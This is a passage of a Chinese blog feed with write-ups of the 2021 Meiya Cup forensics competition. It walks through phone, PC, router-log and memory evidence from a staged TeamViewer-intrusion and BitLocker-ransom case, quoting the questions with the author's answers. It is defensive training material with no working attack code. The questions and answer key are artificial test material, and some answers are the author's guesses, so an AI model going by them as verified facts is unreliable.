/><p>双击这个参数,来到其存储位置,发现了答案选项中的路径</p><img src="/images/meiya-2021-02/35.png" alt="image-35" style="zoom: 67%;" /><br><h2 id="41病毒留下了ASCII-ART艺术图"><a href="#41病毒留下了ASCII-ART艺术图" class="headerlink" title="41病毒留下了ASCII_ART艺术图"></a>41病毒留下了ASCII_ART艺术图</h2><blockquote><p>【多选题】特普的计算机可能中了病毒，病毒留下了 ASCII ART（ASCII艺术，文字图），以下哪个不是病毒留下？（3分）</p><p><strong>A HI</strong></p><p>B HELLO</p><p><strong>C HOW ARE YOU</strong></p><p><strong>D GOODBYE</strong></p></blockquote><p>上一题最后就找到了HELLO:</p><img src="/images/meiya-2021-02/35.png" alt="image-35" style="zoom: 67%;" /><br><h2 id="42病毒扰乱文件的目标文件名"><a href="#42病毒扰乱文件的目标文件名" class="headerlink" title="42病毒扰乱文件的目标文件名"></a>42病毒扰乱文件的目标文件名</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒扰乱文件目标文件名是甚么？（2分）</p><p><strong>A C:\Users&lt;profile&gt;\Documents\target.txt</strong></p><p>B C:\Users&lt;profile&gt;\Desktopt\target txt</p><p>C C:\c.txt</p><p>D C:\temp.txt</p></blockquote><p>字符串中还有个<code>target.txt</code></p><img src="/images/meiya-2021-02/36.png" alt="image-36" style="zoom: 67%;" /><img src="/images/meiya-2021-02/37.png" alt="image-37" style="zoom: 67%;" /><br><h2 id="43病毒的扰乱方法"><a href="#43病毒的扰乱方法" class="headerlink" title="43病毒的扰乱方法"></a>43病毒的扰乱方法</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒扰乱文件方法是甚么？（3分）</p><p><strong>A.+3</strong></p><p>B.XOR 5</p><p>C.+4</p><p>D.-4</p></blockquote><p>不太懂,网上说<code>fgetc</code>可以定位文件读取位置,并进行+3操作</p><img src="/images/meiya-2021-02/38.png" alt="image-38" style="zoom: 67%;" /><img src="/images/meiya-2021-02/39.png" alt="image-39" style="zoom: 67%;" /><br><h2 id="44特普计算机中-哪个是FTK-Imager-exe的程序编号-PID"><a href="#44特普计算机中-哪个是FTK-Imager-exe的程序编号-PID" class="headerlink" title="44特普计算机中,哪个是FTK_Imager.exe的程序编号(PID)"></a>44特普计算机中,哪个是FTK_Imager.exe的程序编号(PID)</h2><p>可以直接使用取证大师小程序的内存取证来搞:</p><img src="/images/meiya-2021-02/40.png" alt="image-40" style="zoom: 67%;" /><br><h2 id="45特普计算机中cmd-exe的执行日期和时间"><a href="#45特普计算机中cmd-exe的执行日期和时间" class="headerlink" title="45特普计算机中cmd.exe的执行日期和时间"></a>45特普计算机中cmd.exe的执行日期和时间</h2><blockquote><p>【多选题】特普的计算机中，cmd.exe（PID：4496）它的执行日期及时间是？（1分）</p><p>A.2021-10.17</p><p>B.2021-10-18</p><p><strong>C.2021-10.19</strong></p><p>D.10.42:51</p><p><strong>E.10:43:09</strong></p><p>F.10:43:25</p></blockquote><img src="/images/meiya-2021-02/41.png" alt="image-41" style="zoom: 67%;" /><p>(注意时区换算)</p><br><h2 id="46特普计算机通过FTP连接了哪个IP"><a href="#46特普计算机通过FTP连接了哪个IP" class="headerlink" title="46特普计算机通过FTP连接了哪个IP"></a>46特普计算机通过FTP连接了哪个IP</h2><p>使用自定义取证中的<code>路由器日志解析</code></p><p>在IP地址中只能发现一个外部IP <code>124.217.179.74</code>,那么应该就是这个</p><img src="/images/meiya-2021-02/42.png" alt="image-42" style="zoom: 67%;" /><br><h2 id="47特普计算机中-哪一个指令于上题的FTP连接中使用过"><a href="#47特普计算机中-哪一个指令于上题的FTP连接中使用过" class="headerlink" title="47特普计算机中,哪一个指令于上题的FTP连接中使用过"></a>47特普计算机中,哪一个指令于上题的FTP连接中使用过</h2><blockquote><p>【多选题】特普的计算机中，以下哪一个指令于上述连接中有使用过？（3分）</p><p>A get</p><p><strong>B put</strong></p><p>C delete</p><p><strong>D bye</strong></p><p>E Quit</p></blockquote><p>常识题了,FTP命令:</p><ul><li><code>ftp 目标IP</code>:连接FTP服务器</li><li><code>get 目标路径</code>:下载目标路径的文件</li><li><code>put 本地路径 目标路径</code>:将本地路径的文件上传到目标路径</li><li><code>mput</code>:批量上传文件</li><li><code>bye</code>:断开连接</li></ul><p>结合实际情况,这个计算机应该是被别人通过FTP上传了病毒文件,因此肯定使用过的命令包括 put 和 bye</p><br><h2 id="48在Linux的volatility中-哪一个指令可以知道此程式支持哪个Windows版本"><a href="#48在Linux的volatility中-哪一个指令可以知道此程式支持哪个Windows版本" class="headerlink" title="48在Linux的volatility中,哪一个指令可以知道此程式支持哪个Windows版本"></a>48在Linux的volatility中,哪一个指令可以知道此程式支持哪个Windows版本</h2><blockquote><p>【多选题】在Liux的” volatility”中，哪一个指令可以知道此程式支持哪个 Windows版本？（2分）</p><p><strong>A vol.py –profile</strong></p><p>B vol.py –systeminfo</p><p>C vol.py –info</p><p>D vol.py–verinfo</p></blockquote><p>常识题,答案是A</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_个人赛</title>
      <link href="/post/51090d68.html"/>
      <url>/post/51090d68.html</url>
      
        <content type="html"><![CDATA[<h1 id="PART1工地主管IPhone"><a href="#PART1工地主管IPhone" class="headerlink" title="PART1工地主管IPhone"></a>PART1工地主管IPhone</h1><p>此次比赛提供了Cellebrite Reader用来读取手机镜像文件,直接用其加载IPhone的ufdr备份镜像文件</p><p>打开之后可以先去<code>工具-设置</code>中把语言改成中文</p><h2 id="1工地主管的微信账号"><a href="#1工地主管的微信账号" class="headerlink" title="1工地主管的微信账号"></a>1工地主管的微信账号</h2><blockquote><p>[单选题] 工地主管电话的微信账号是什么? (1分)</p><p>A. Kasier751111</p><p>B. Kasierlee751111</p><p>C. Kasierlee</p><p>D. 以上皆非</p></blockquote><p>当头一棒,这个镜像里找不到关于微信的数据,官方也没有给出答案..</p><p>社交软件中只能看到Whatsapp</p><img src="/images/meiya-2021-01/image-20220806161820372.png" alt="image-20220806161820372" style="zoom:67%;" /><br><h2 id="2工地主管的隔空投送编号"><a href="#2工地主管的隔空投送编号" class="headerlink" title="2工地主管的隔空投送编号"></a>2工地主管的隔空投送编号</h2><p>隔空投送也就是Airdrop,这个在加载镜像后的软件首页就能够看见</p><img src="/images/meiya-2021-01/image-20220806161948387.png" alt="image-20220806161948387" style="zoom:67%;" /><br><h2 id="3工地主管电话的哪个应用程序有关于经纬度24-490474-118-110220的纪录"><a href="#3工地主管电话的哪个应用程序有关于经纬度24-490474-118-110220的纪录" class="headerlink" title="3工地主管电话的哪个应用程序有关于经纬度24.490474,118.110220的纪录"></a>3工地主管电话的哪个应用程序有关于经纬度24.490474,118.110220的纪录</h2><blockquote><p>[单选题] 工地主管电话的哪一个应用程序有关于于经纬度24.490474, 118.110220的纪录? (2分)</p><p>A. 照片</p><p>B. WhatsApp</p><p>C. Apple Maps</p><p>D. 以上皆非</p></blockquote><p>在<code>设备位置-位置-Apple Maps</code>中找到:</p><img src="/images/meiya-2021-01/image-20220806162215907.png" alt="image-20220806162215907" style="zoom:67%;" /><br><h2 id="4工地主管的电话中哪些数据正确"><a href="#4工地主管的电话中哪些数据正确" class="headerlink" title="4工地主管的电话中哪些数据正确"></a>4工地主管的电话中哪些数据正确</h2><blockquote><p>[多选题] 工地主管的手提电话中下列哪些数据正确? (1分)</p><p>A. iOS 版本为 12.5.4</p><p>B. IMEI 为 454120637213361</p><p>C. Apple ID 为 <a href="mailto:&#x6b;&#97;&#105;&#x73;&#101;&#114;&#108;&#x65;&#x65;&#x33;&#54;&#x36;&#48;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#x6b;&#97;&#105;&#x73;&#101;&#114;&#108;&#x65;&#x65;&#x33;&#54;&#x36;&#48;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a></p><p>D. 手机曾经安装dropbox 应用程序</p></blockquote><p>根据设备信息,可以确定B错误,D项没有找到,所以也没选</p><img src="/images/meiya-2021-01/image-20220806162418209.png" alt="image-20220806162418209" style="zoom:67%;" /><br><h2 id="5工地主管电话最常使用的浏览器"><a href="#5工地主管电话最常使用的浏览器" class="headerlink" title="5工地主管电话最常使用的浏览器"></a>5工地主管电话最常使用的浏览器</h2><p>找到Web浏览的历史记录,发现记录都来自SAFARI浏览器:</p><img src="/images/meiya-2021-01/image-20220806162546601.png" alt="image-20220806162546601" style="zoom:67%;" /><br><h2 id="6工地主管电话连过哪个Wifi"><a href="#6工地主管电话连过哪个Wifi" class="headerlink" title="6工地主管电话连过哪个Wifi"></a>6工地主管电话连过哪个Wifi</h2><blockquote><p>[单选题] 工地主管的电话连接过哪一个WiFi? (1分)</p><p>A. Kaiser Lee</p><p>B. Kaiser</p><p>C. Free Wifi</p><p>D. Kaiser Home</p></blockquote><p>在<code>无线网络连接</code>里查看:</p><img src="/images/meiya-2021-01/image-20220806162715419.png" alt="image-20220806162715419" style="zoom:67%;" /><br><h2 id="7工地主管和AlexChan对话中提过哪些TeamViewer号码"><a href="#7工地主管和AlexChan对话中提过哪些TeamViewer号码" class="headerlink" title="7工地主管和AlexChan对话中提过哪些TeamViewer号码"></a>7工地主管和AlexChan对话中提过哪些TeamViewer号码</h2><blockquote><p>[多选题] 工地主管与Alex Chan的Whatsapp 对话中，曾提及以下哪个TeamViewer的用户号码? (3分)</p><p>A. 435334881</p><p>B. 453851521</p><p>C. 435475200</p><p>D. 456874155</p><p>E. 435270306</p></blockquote><p>在<code>聊天</code>中搜索「Alex」就可以定位工地主管和Alex Chan的聊天记录</p><p><span id="meiya_person_03" style='color:black;background:yellow;font-size:16px;font-family:hei'><strong>根据聊天记录可以初步梳理案情:</strong></span></p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>首先alex自称是修电脑的,并让主管在电脑上安装<strong>远程控制软件teamviewer</strong>,然后又让主管给其同事的电脑上也装上,主管不仅丝毫没有怀疑,甚至还去饮了个茶?</span></p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>装好后主管把自己和同事电脑teamviewer的ID给了alex,这样alex就可以远程登录这三台电脑了</span></p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>第二天主管发现电脑磁盘被BitLocker加密了,然后被alex勒索btc</span></p><p>从聊天记录的图片中就可以找到TeamViewer号码,共三个,也就是主管和其他两个员工电脑的TeamViewerID</p><br><h2 id="8工地主管的WhatsApp中有多少个黑名单的记录"><a href="#8工地主管的WhatsApp中有多少个黑名单的记录" class="headerlink" title="8工地主管的WhatsApp中有多少个黑名单的记录"></a>8工地主管的WhatsApp中有多少个黑名单的记录</h2><p>这题需要有意识地去数据库文件里寻找</p><p>首先通过任意WhatsApp聊天记录的<code>源文件</code>可以定位此APP数据库的位置</p><img src="/images/meiya-2021-01/image-20220806163926762.png" alt="image-20220806163926762" style="zoom:67%;" /><p>按照这个路径找到<code>sqlite</code>格式的数据库文件并导出</p><img src="/images/meiya-2021-01/image-20220806164012007.png" alt="image-20220806164012007" style="zoom:67%;" /><p>通过读取工具<code>DB Browser</code>查看此数据库文件,通过表名可以定位一个黑名单表,是一个空表.所以黑名单记录数量为0</p><img src="/images/meiya-2021-01/image-20220806164116241.png" alt="image-20220806164116241" style="zoom:67%;" /><br><h2 id="9哪个蓝牙装置的Uuid-曾连接过工地主管的手机"><a href="#9哪个蓝牙装置的Uuid-曾连接过工地主管的手机" class="headerlink" title="9哪个蓝牙装置的Uuid 曾连接过工地主管的手机"></a>9哪个蓝牙装置的Uuid 曾连接过工地主管的手机</h2><blockquote><p>[多选题] 以下哪个蓝牙装置的Uuid 曾连接过工地主管的手机? (2分)</p><p>A. 7F1FE70D-2B15-C245-853D-4196F13CC446</p><p>B. 1B057C1D-83D3-99A6-D2B1-EC54846C7CEE</p><p>C. 134ACD1-83D3-99A6-D2B1-EC54846C7CEE</p><p>D. 7D1BE70D-2C16-D246-851D-491613DD776</p></blockquote><p>这题仍然需要到数据库文件中去寻找,首先从<code>设备与网络-设备连接</code>中找到蓝牙连接的记录,由此定位源文件</p><img src="/images/meiya-2021-01/image-20220806164349346.png" alt="image-20220806164349346" style="zoom:67%;" /><p>顺着这个路径找到数据库文件并查看,可以找到两条记录:</p><img src="/images/meiya-2021-01/image-20220806164433306.png" alt="image-20220806164433306" style="zoom:67%;" /><br><hr><br><h1 id="PART2工地主管Windows"><a href="#PART2工地主管Windows" class="headerlink" title="PART2工地主管Windows"></a>PART2工地主管Windows</h1><p>使用取证大师加载计算机镜像,打开后可以看到此电脑的E盘被<code>BitLocker</code>加密了</p><p>这里先不要费劲去寻找解密密钥啥的,因为Alex肯定不会傻傻地把恢复文件也存放在工地主管的电脑上,想要解密这个分区估计得后面到Alex的设备中去找….</p><h2 id="10-工地主管计算机的E盘的Bitlocker修复密钥标识符"><a href="#10-工地主管计算机的E盘的Bitlocker修复密钥标识符" class="headerlink" title="10 工地主管计算机的E盘的Bitlocker修复密钥标识符"></a>10 工地主管计算机的E盘的Bitlocker修复密钥标识符</h2><p>右键-BitLocker解密 就能看到这个恢复密钥标记</p><img src="/images/meiya-2021-01/image-20220806164828158.png" alt="image-20220806164828158" style="zoom:67%;" /><br><h2 id="11-工地主管计算机內FileZilla的用户名名称"><a href="#11-工地主管计算机內FileZilla的用户名名称" class="headerlink" title="11 工地主管计算机內FileZilla的用户名名称"></a>11 工地主管计算机內FileZilla的用户名名称</h2><p><span id="meiya_person_02">自动确证结果中就能找到:</span></p><img src="/images/meiya-2021-01/image-20220806165027692.png" alt="image-20220806165027692" style="zoom:67%;" /><br><h2 id="12工地主管的Team-Viewer-ID"><a href="#12工地主管的Team-Viewer-ID" class="headerlink" title="12工地主管的Team Viewer ID"></a>12工地主管的Team Viewer ID</h2><p>这题从[工地主管的手机中的「工地主管和alex的WhatsApp聊天记录图片」](# 7 工地主管和AlexChan对话中提过哪些TeamViewer号码)中就可以找到</p><img src="/images/meiya-2021-01/image-20220806165332531.png" alt="image-20220806165332531" style="zoom:67%;" /><br><h2 id="13-工地主管TeamViewer与哪一个ID连接"><a href="#13-工地主管TeamViewer与哪一个ID连接" class="headerlink" title="13 工地主管TeamViewer与哪一个ID连接"></a>13 工地主管TeamViewer与哪一个ID连接</h2><p>自动取证结果中找到: 这个是Alex设备的TeamViewer ID</p><img src="/images/meiya-2021-01/image-20220806165442694.png" alt="image-20220806165442694" style="zoom:67%;" /><br><h2 id="14工地主管曾用计算机浏览器搜索的关键词"><a href="#14工地主管曾用计算机浏览器搜索的关键词" class="headerlink" title="14工地主管曾用计算机浏览器搜索的关键词"></a>14工地主管曾用计算机浏览器搜索的关键词</h2><blockquote><p>[多选题] 工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻? (3分)</p><p>A. tiktok</p><p>B. web whatsapp</p><p>C. facebook</p><p>D. lihkg</p><p>E. hkgolden</p><p>F. web wechat</p></blockquote><p>仍然是自动取证,一一对应一下即可:</p><img src="/images/meiya-2021-01/image-20220806165649981.png" alt="image-20220806165649981" style="zoom:67%;" /><br><h2 id="15工地主管计算机的Windows系统的产品标识符"><a href="#15工地主管计算机的Windows系统的产品标识符" class="headerlink" title="15工地主管计算机的Windows系统的产品标识符"></a>15工地主管计算机的Windows系统的产品标识符</h2><p>产品标识符也就是产品ID．在取证结果-<code>系统信息</code>找到:</p><img src="/images/meiya-2021-01/image-20220806170132362.png" alt="image-20220806170132362" style="zoom:67%;" /><br><h2 id="16-工地主管曾用计算机WhatsApp与哪个号码沟通"><a href="#16-工地主管曾用计算机WhatsApp与哪个号码沟通" class="headerlink" title="16 工地主管曾用计算机WhatsApp与哪个号码沟通"></a>16 工地主管曾用计算机WhatsApp与哪个号码沟通</h2><p>没找到….</p><br><h2 id="17工地主管计算机的用户名称和用户标识符"><a href="#17工地主管计算机的用户名称和用户标识符" class="headerlink" title="17工地主管计算机的用户名称和用户标识符"></a>17工地主管计算机的用户名称和用户标识符</h2><blockquote><p>[多选题] 工地主管计算机的用户名称是甚么? 其用户标识符是甚么? (2分)</p><p>A. 用户名称: PC1</p><p>B. 用户名称: PC2</p><p>C. 用户名称: PC3</p><p>D. 用户标识符: 0x000003E7</p><p>E. 用户标识符: 0x000003E8</p><p>F. 用户标识符: 0x000003E9</p></blockquote><p>首先从<code>用户信息</code>中定位用户名</p><img src="/images/meiya-2021-01/image-20220806170349200.png" alt="image-20220806170349200" style="zoom:67%;" /><p><strong>选项中的用户标识符明显是16进制数字,所以需要把此用户的用户标识符数字转为16进制查看</strong></p><p>PC1的用户标识SID中,最后一段的1001转为16进制为3E9,也就是F选项</p><br><h2 id="18工地主管计算机的预设浏览器"><a href="#18工地主管计算机的预设浏览器" class="headerlink" title="18工地主管计算机的预设浏览器"></a>18工地主管计算机的预设浏览器</h2><p>这题使用仿真软件仿真进去之后,建一个html文件,看看默认使用什么浏览器打开这个文件就好了</p><h2 id="19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3-xlsx的SHA1哈希值"><a href="#19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3-xlsx的SHA1哈希值" class="headerlink" title="19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3.xlsx的SHA1哈希值"></a>19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3.xlsx的SHA1哈希值</h2><p>工地主管计算机的E盘被加密,做此题需要首先寻找分区的<strong>解密密钥</strong></p><p>解密密钥在<a href="#meiya_person_01">ALEX的FTP服务器</a>中</p><p>解开分区之后很容易找到题目中的文件,计算哈希值就行了</p><img src="/images/meiya-2021-01/image-20220807095226068.png" alt="image-20220807095226068" style="zoom:67%;" /><br><hr><br><h1 id="PART3工地路由器"><a href="#PART3工地路由器" class="headerlink" title="PART3工地路由器"></a>PART3工地路由器</h1><h2 id="20路由器记录中的哪些IP是公司的电子器材"><a href="#20路由器记录中的哪些IP是公司的电子器材" class="headerlink" title="20路由器记录中的哪些IP是公司的电子器材"></a>20路由器记录中的哪些IP是公司的电子器材</h2><blockquote><p>[多选题] 路由器的记录中显示以下有哪些IP是公司的电子器材? (3分)</p><p>A. 192.168.40.128</p><p>B. 192.168.40.129</p><p>C. 192.168.40.130</p><p>D. 192.168.40.131</p><p>E. 192.168.40.132</p></blockquote><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>在对工地主管的Windows进行分析时,可以从<code>取证结果</code>-<code>网络连接</code>中找到路由器和工地主管计算机的内网IP:</span></p><img src="/images/meiya-2021-01/image-20220807100022169.png" alt="image-20220807100022169" style="zoom:67%;" /><p>此路由器的内网网段为<code>192.168.40</code>,工地主管Windows的内网IP是<code>192.168.40.129</code></p><p>接下来在路由器日志里搜索选项中的IP地址就行了: 只有E是搜不到的</p><img src="/images/meiya-2021-01/image-20220807100211575.png" alt="image-20220807100211575" style="zoom:67%;" /><br><h2 id="21路由器记录中显示公司计算机下载了FTP软件-该下载网站的IP"><a href="#21路由器记录中显示公司计算机下载了FTP软件-该下载网站的IP" class="headerlink" title="21路由器记录中显示公司计算机下载了FTP软件,该下载网站的IP"></a>21路由器记录中显示公司计算机下载了FTP软件,该下载网站的IP</h2><p>在<a href="#meiya_person_02">分析工地主管PC</a>时已经知道其使用的FTP软件时FileZilla</p><p>在路由器记录中直接搜索关键词「FTP」无果,但是搜索「FileZilla」可以定位这里:</p><img src="/images/meiya-2021-01/image-20220807173643623.png" alt="image-20220807173643623" style="zoom:67%;" /><p>其对应的IP为49.12.121.47</p><br><h2 id="22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口"><a href="#22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口" class="headerlink" title="22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口"></a>22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口</h2><p><span id="meiya_person_04">在工地主管PC的自动取证结果中可以找到FileZilla连接的IP:</span></p><img src="/images/meiya-2021-01/image-20220807173847517.png" alt="image-20220807173847517" style="zoom:67%;" /><p>这里给出的连接端口是23,并不在选项中,因此可以在路由器记录中继续搜索这个IP,可以看到使用了21端口,也就是FTP的默认端口</p><img src="/images/meiya-2021-01/image-20220807173934021.png" alt="image-20220807173934021" style="zoom:67%;" /><br><h2 id="23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机"><a href="#23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机" class="headerlink" title="23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机"></a>23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机</h2><blockquote><p>[多选题] 路由器的记录中显示以下哪些关键词是表示公司计算机与外界网络联机? (2分)</p><p>A. destination</p><p>B. ICMP echo request</p><p>C. inside</p><p>D. outside</p><p>E. 以上皆是</p></blockquote><p>这个凭借常识或者上一题的结果就能够看出来了,AD</p><p>此外<code>inside</code>表示内网中的地址,<code>ICMP echo request</code>表示ICMP回送请求报文(也就是<code>ping</code>某个IP时产生的)</p><br><h2 id="24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机"><a href="#24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机" class="headerlink" title="24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机"></a>24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机</h2><blockquote><p>[单选题] 路由器的记录中显示哪一个IP曾以teamviewer 连接公司计算机? (1分)</p><p>A. 110.152.0.14</p><p>B. 52.152.117.114</p><p>C. 180.152.0.13</p><p>D. 83.26.80.131</p></blockquote><p>首先可以在工地主管PC的取证结果中找到被TeamViewer连接的时间</p><img src="/images/meiya-2021-01/image-20220807174552169.png" alt="image-20220807174552169" style="zoom:67%;" /><p>然后在路由器记录中定位这个时间(<strong>要注意换算UTC时间和东八区时间</strong>)</p><img src="/images/meiya-2021-01/image-20220807174757964.png" alt="image-20220807174757964" style="zoom:67%;" /><p>补充一个知识点:</p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>teamviewer默认使用的端口为<strong>5938</strong>,开始运行时首先使用<strong>53(DNS)<strong>端口来解析域名,然后使用</strong>5938</strong>端口来连接远程主机</span></p><br><h2 id="25对方通过teamviewer-遥控公司计算机的时间"><a href="#25对方通过teamviewer-遥控公司计算机的时间" class="headerlink" title="25对方通过teamviewer 遥控公司计算机的时间"></a>25对方通过teamviewer 遥控公司计算机的时间</h2><blockquote><p>[多选题] 路由器的记录中显示以下哪一个有可能是以teamviewer 遥控公司计算机的时间? (3分)</p><p>A. 09:31, 09:37</p><p>B. 0933, 09:39</p><p>C. 10:29, 10:36</p><p>D. 10:40</p><p>E. 10:42</p></blockquote><p>由上一题可以知道对方是通过<code>52.152.117.114</code>来进行远程连接的</p><p>那么可以在路由器记录中继续搜索这个IP地址</p><img src="/images/meiya-2021-01/image-20220807175432690.png" alt="image-20220807175432690" style="zoom:67%;" /><p>能够搜索到的在选项里的时间为ACE</p><br><h2 id="26路由器记录中显示有多少电子器材有可能曾被入侵"><a href="#26路由器记录中显示有多少电子器材有可能曾被入侵" class="headerlink" title="26路由器记录中显示有多少电子器材有可能曾被入侵"></a>26路由器记录中显示有多少电子器材有可能曾被入侵</h2><p><a href="#meiya_person_03">结合案件背景</a>:</p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>Alex除了通过Teamviewer连接了工地主管的PC之外,还连接了另外两个员工的PC,所以本题首先猜测答案为3</span></p><p>接下来去路由器记录中搜索验证,还是像上一题一样去搜索攻击者的IP<code>52.152.117.114</code>:</p><p>可以定位内网IP<code>192.168.40.129</code>也就是工地主管的PC：</p><img src="/images/meiya-2021-01/image-20220807180315801.png" alt="image-20220807180315801" style="zoom:67%;" /><p>继续搜索还能够定位<code>192.168.40.128</code>和<code>192.168.40.130</code>两个内网IP,可以判断这是另外两个员工的电脑:</p><img src="/images/meiya-2021-01/image-20220807180435387.png" alt="image-20220807180435387" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220807180448060.png" alt="image-20220807180448060" style="zoom:67%;" /><br><hr><br><h1 id="PART3ALEX的Iphone12pro和IPhoneXR"><a href="#PART3ALEX的Iphone12pro和IPhoneXR" class="headerlink" title="PART3ALEX的Iphone12pro和IPhoneXR"></a>PART3ALEX的Iphone12pro和IPhoneXR</h1><h2 id="27-2021年10月21日，以下哪一张相片可能曾被分享"><a href="#27-2021年10月21日，以下哪一张相片可能曾被分享" class="headerlink" title="27_2021年10月21日，以下哪一张相片可能曾被分享"></a>27_2021年10月21日，以下哪一张相片可能曾被分享</h2><blockquote><p>[多选题] 阿力士iPhone 12 pro电话 于2021年10月21日，以下哪一张相片可能曾被分享 (UTC+8)? (3分)</p><p>A. IMG_0011.HEIC</p><p>B. IMG_0010.HEIC</p><p>C. IMG_0009.HEIC</p><p>D. IMG_0008.HEIC</p><p>E. IMG_0007.HEIC</p></blockquote><p>一般在聊天中发送图片时,图片的元数据会被抹掉.</p><p>所以,<span style='color:black;background:yellow;font-size:16px;font-family:hei'>被分享过的图片除了原图意外,还会存在一个不带有元数据的图片副本,根据副本的存在可以判断哪些图片被分享过</span></p><p>所以这里首先应用过滤器: <code>过滤--元数据--不带有元数据</code></p><img src="/images/meiya-2021-01/image-20220807191048409.png" alt="image-20220807191048409" style="zoom:67%;" /><p>确定好是哪一张图片后,再从图像库中找到对应的原图名称就好了:</p><img src="/images/meiya-2021-01/image-20220807191132379.png" alt="image-20220807191132379" style="zoom:67%;" /><br><h2 id="28哪一张相片可能曾被修改拍摄时间"><a href="#28哪一张相片可能曾被修改拍摄时间" class="headerlink" title="28哪一张相片可能曾被修改拍摄时间"></a>28哪一张相片可能曾被修改拍摄时间</h2><blockquote><p>[单选题] 阿力士iPhone 12 pro电话中哪一张相片可能曾被修改拍摄时间? (2分)</p><p>A. IMG_0011.HEIC</p><p>B. IMG_0010.HEIC</p><p>C. IMG_0009.HEIC</p><p>D. IMG_0008.HEIC</p></blockquote><p>使用手机修改过的图片可能会同时存储修改前和修改后的图片</p><p>上一题定位的那张图片就可以找到三张一样的: 那么可以推测是为了发送给其他人而修改了拍摄时间</p><img src="/images/meiya-2021-01/image-20220807191616039.png" alt="image-20220807191616039" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220807191630989.png" alt="image-20220807191630989" style="zoom:67%;" /><img src="/images/meiya-2021-01/image-20220807191641847.png" alt="image-20220807191641847" style="zoom:67%;" /><br><h2 id="29此IPhone的GSM媒体访问控制地址是什么"><a href="#29此IPhone的GSM媒体访问控制地址是什么" class="headerlink" title="29此IPhone的GSM媒体访问控制地址是什么"></a>29此IPhone的GSM媒体访问控制地址是什么</h2><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'><strong>媒体访问控制地址实际上就是MAC地址！</strong></span>在设备信息里就能够看到</p><img src="/images/meiya-2021-01/image-20220807191924974.png" alt="image-20220807191924974" style="zoom:67%;" /><br><h2 id="30此IPhone以什么锁屏密码保护"><a href="#30此IPhone以什么锁屏密码保护" class="headerlink" title="30此IPhone以什么锁屏密码保护"></a>30此IPhone以什么锁屏密码保护</h2><blockquote><p>[单选题] 阿力士的iphone 12 pro以什么屏幕密码保护? (1分)</p><p>A. 6位阿拉伯数字密码</p><p>B. 4位阿拉伯数字密码</p><p>C. 图形密码</p><p>D. 以上皆非</p></blockquote><p>此题需要找到并导出<code>manifest.plist</code>文件,这个文件记录和和设备有关的各种信息,很重要!!</p><img src="/images/meiya-2021-01/image-20220807192203438.png" alt="image-20220807192203438" style="zoom:67%;" /><p>可以使用plistEditor来打开此文件</p><img src="/images/meiya-2021-01/image-20220808000335079.png" alt="image-20220808000335079" style="zoom:67%;" /><p>打开文件搜索passcode,可以找到一个名为<code>WasPasscodeSet</code>的键,它的值是<code>false</code></p><p>根据字面意思就可以判断,此IPhone没有设置密码</p><br><h2 id="31此IPhone中哪一张相片是实况相片"><a href="#31此IPhone中哪一张相片是实况相片" class="headerlink" title="31此IPhone中哪一张相片是实况相片"></a>31此IPhone中哪一张相片是实况相片</h2><blockquote><p>[多选题] 阿力士iphone 12 pro内以下哪一张相片是实况相片(live Photos)? (2分)</p><p>A. IMG_0011.HEIC</p><p>B. IMG_0010.HEIC</p><p>C. IMG_0012.HEIC</p><p>D. IMG_0009.HEIC</p></blockquote><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>使用IPhone实况模式拍摄的照片是储存有对应的视频格式的</span></p><p>因此,只要能够找到和照片对应的视频格式文件,就能够说明这张照片是实况照片</p><img src="/images/meiya-2021-01/image-20220808000830193.png" alt="image-20220808000830193" style="zoom:67%;" /><p>只有C选项找不到,所以选择ABD</p><br><h2 id="32此IPhone可能连接过哪些设备"><a href="#32此IPhone可能连接过哪些设备" class="headerlink" title="32此IPhone可能连接过哪些设备"></a>32此IPhone可能连接过哪些设备</h2><blockquote><p>[单选题] 以下哪一个是阿力士iphone 12 pro可能曾经连接的装置名称? (2分)</p><p>A. Chris’s MacBook Pro</p><p>B. Chirs’s iPhone</p><p>C. Chirs’s Computer</p><p>D. Chirs’s Linux</p></blockquote><p>在联系人中可以找到连接过的设备:</p><img src="/images/meiya-2021-01/image-20220808001048026.png" alt="image-20220808001048026" style="zoom:67%;" /><br><h2 id="33接上题-连接时间是何时"><a href="#33接上题-连接时间是何时" class="headerlink" title="33接上题,连接时间是何时"></a>33接上题,连接时间是何时</h2><blockquote><p>[多选题] 接上题，记录连接时间是什么时候(UTC+8)? (2分)</p><p>A. 2021年10月21日 00:58:01</p><p>B. 2021年10月21日 08:58:01</p><p>C. 2021年10月21日 00:58:29</p><p>D. 2021年10月21日 